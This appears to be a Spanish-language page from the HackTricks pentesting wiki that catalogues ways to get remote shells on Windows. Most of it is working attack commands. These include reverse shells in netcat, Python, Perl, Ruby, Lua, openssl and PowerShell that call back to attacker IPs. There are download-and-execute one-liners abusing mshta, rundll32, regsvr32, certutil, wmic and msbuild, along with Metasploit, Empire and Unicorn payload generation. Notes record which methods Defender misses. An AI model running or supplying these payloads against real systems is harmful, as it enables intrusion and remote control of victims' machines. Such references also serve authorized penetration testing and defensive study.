# Shells - Windows

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan más para poder arreglarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

La página [lolbas-project.github.io](https://lolbas-project.github.io/) es para Windows lo que [https://gtfobins.github.io/](https://gtfobins.github.io/) es para Linux.\
Obviamente, **no hay archivos SUID ni privilegios de sudo en Windows**, pero es útil saber **cómo** algunos **binarios** pueden ser (mal)utilizados para realizar acciones inesperadas como **ejecutar código arbitrario.**

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** es un clon de Netcat, diseñado para ser portátil y ofrecer encriptación fuerte. Funciona en sistemas operativos similares a Unix y en Microsoft Win32. sbd cuenta con encriptación AES-CBC-128 + HMAC-SHA1 (por Christophe Devine), ejecución de programas (opción -e), elección de puerto de origen, reconexión continua con retraso y algunas otras características interesantes. sbd solo admite comunicación TCP/IP. sbd.exe (parte de la distribución de Kali Linux: /usr/share/windows-resources/sbd/sbd.exe) puede ser subido a una caja de Windows como una alternativa a Netcat.

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Víctima
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Llamada de red realizada por el proceso: **powershell.exe**\
Carga útil escrita en disco: **NO** (_¡al menos en ningún lugar que pudiera encontrar usando procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Llamada de red realizada por el proceso: **svchost.exe**\
Carga útil escrita en disco: **Caché local del cliente WebDAV**

**En una línea:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Obtén más información sobre diferentes Powershell Shells al final de este documento**

## Mshta
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
Llamada de red realizada por el proceso: **mshta.exe**\
Carga útil escrita en disco: **caché local de IE**
```bash
mshta http://webserver/payload.hta
```
Proceso que realiza llamada de red: **mshta.exe**\
Carga útil escrita en disco: **caché local de IE**
```bash
mshta \\webdavserver\folder\payload.hta
```
Proceso que realiza llamada de red: **svchost.exe**\
Carga útil escrita en disco: **Caché local del cliente WebDAV**

#### **Ejemplo de shell inversa hta-psh (usa hta para descargar y ejecutar backdoor de PS)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Puedes descargar y ejecutar muy fácilmente un zombi Koadic usando el stager hta**

#### Ejemplo de hta
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
**Extraído de** [**aquí**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)

#### **mshta - sct**
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
**Extraído de** [**aquí**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)

#### **Mshta - Metasploit**
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Detectado por el defensor**

## **Rundll32**

[**Ejemplo de Dll hola mundo**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
Proceso que realiza llamada de red: **svchost.exe**\
Carga útil escrita en disco: **Caché local del cliente WebDAV**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Llamada de red realizada por el proceso: **rundll32.exe**\
Carga útil escrita en disco: **Caché local de IE**

**Detectado por Defender**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
**Extraído de** [**aquí**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)

#### **Rundll32 - Metasploit**
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
Proceso que realiza llamada de red: **regsvr32.exe**\
Carga útil escrita en disco: **Caché local de IE**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Proceso que realiza llamada de red: **svchost.exe**\
Carga útil escrita en disco: **Caché local del cliente WebDAV**

**Detectado por defender**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
**Extraído de** [**aquí**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)

#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Puedes descargar y ejecutar muy fácilmente un zombi Koadic usando el stager regsvr**

## Certutil

Descarga un B64dll, descodifícalo y ejecútalo.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Descarga un B64exe, decodifícalo y ejecútalo.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Detectado por el defensor**

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan más para poder arreglarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnológico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Detectado por el defensor**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Proceso que realiza llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Detectado por el defensor**

## **MSIExec**

Atacante
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Víctima:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Detectado**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
Llamada de red realizada por el proceso: **wmic.exe**\
Carga útil escrita en disco: **caché local de IE**

Ejemplo de archivo xsl:
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
Extraído de [aquí](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**No detectado**

**Puedes descargar y ejecutar muy fácilmente un zombi Koadic usando el stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Proceso que realiza llamada de red: **svchost.exe**\
Carga útil escrita en disco: **Caché local del cliente WebDAV**

Puedes usar esta técnica para evadir la Lista Blanca de Aplicaciones y las restricciones de Powershell.exe. Se te presentará con una shell de PS.\
Solo descarga esto y ejecútalo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**No detectado**

## **CSC**

Compila código C# en la máquina víctima.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Puedes descargar un shell reverso básico en C# desde aquí: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**No detectado**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
Proceso que realiza llamada de red: **svchost.exe**\
Carga útil escrita en disco: **Caché local del cliente WebDAV**

**No lo he probado**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
Proceso que realiza llamada de red: **svchost.exe**\
Carga útil escrita en disco: **Caché local del cliente WebDAV**

**No lo he probado**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells de Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

En la carpeta **Shells**, hay muchas shells diferentes. Para descargar y ejecutar Invoke-_PowerShellTcp.ps1_ haz una copia del script y añade al final del archivo:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Comience a servir el script en un servidor web y ejecútelo en el extremo de la víctima:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender no lo detecta como código malicioso (aún, 3/04/2019).

**TODO: Verificar otras shells de nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Descargar, iniciar un servidor web, iniciar el listener y ejecutarlo en el extremo de la víctima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender no lo detecta como código malicioso (aún, 3/04/2019).

**Otras opciones ofrecidas por powercat:**

Bind shells, Reverse shell (TCP, UDP, DNS), Redirección de puertos, subida/descarga, Generar payloads, Servir archivos...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Crea un lanzador de powershell, guárdalo en un archivo y descárgalo y ejecútalo.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Detectado como código malicioso**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Crea una versión en powershell de la puerta trasera de metasploit utilizando unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Inicie msfconsole con el recurso creado:
```
msfconsole -r unicorn.rc
```
Inicie un servidor web que sirva el archivo _powershell\_attack.txt_ y ejecute en la víctima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Detectado como código malicioso**

## Más

[PS>Attack](https://github.com/jaredhaight/PSAttack) Consola PS con algunos módulos ofensivos de PS pre-cargados (cifrados)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Consola PS con algunos módulos ofensivos de PS y detección de proxy (IEX)

## Bibliografía

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan más para poder solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnológico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
